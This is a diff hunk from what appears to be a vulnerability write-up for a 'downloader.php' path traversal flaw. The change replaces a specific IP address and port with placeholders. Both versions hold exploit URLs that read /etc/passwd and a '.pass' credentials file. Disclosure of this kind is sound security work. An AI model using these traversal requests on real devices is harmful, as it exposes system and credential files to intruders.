@@ -31,9 +31,9 @@ height="3.1743055555555557in"}
 
 Arbitrary file reading:
 
-<http://114.173.169.190:8001/downloader.php?file=/home/contec/conf/../../../../../../etc/passwd>
+<http://ip:port/downloader.php?file=/home/contec/conf/../../../../../../etc/passwd>
 
-<http://114.173.169.190:8001/downloader.php?file=/home/contec/conf/.pass>
+<http://ip:port/downloader.php?file=/home/contec/conf/.pass>
 
 ![](./images/media/image3.png){width="5.754861111111111in"
 height="2.2083333333333335in"}
